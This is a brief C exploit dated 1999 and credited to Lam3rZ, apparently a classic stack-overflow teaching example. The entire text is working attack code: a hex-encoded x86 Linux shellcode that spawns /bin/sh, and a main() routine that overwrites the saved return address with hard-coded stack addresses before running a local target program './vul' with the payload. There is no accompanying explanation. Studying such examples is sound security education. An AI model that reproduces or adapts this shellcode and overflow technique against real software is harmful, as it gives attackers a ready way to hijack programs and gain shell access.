/* Example exploit no. 1 (c) by Lam3rZ 1999 :) */

char shellcode[] =
    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
    "\xff\xff/bin/sh";
char addr[5]="AAAA\x00";

char buf[36];
int * p;

main() {
    memset(buf,'A',32);
    p = (int *)(buf+32);
    *p=0xbffffeb4;  //  <<== let us point at RET
    p = (int *)(addr);
    *p=0xbfffff9b;  //  <<== new RET value

    execle("./vul",shellcode,buf,addr,0,0);
}
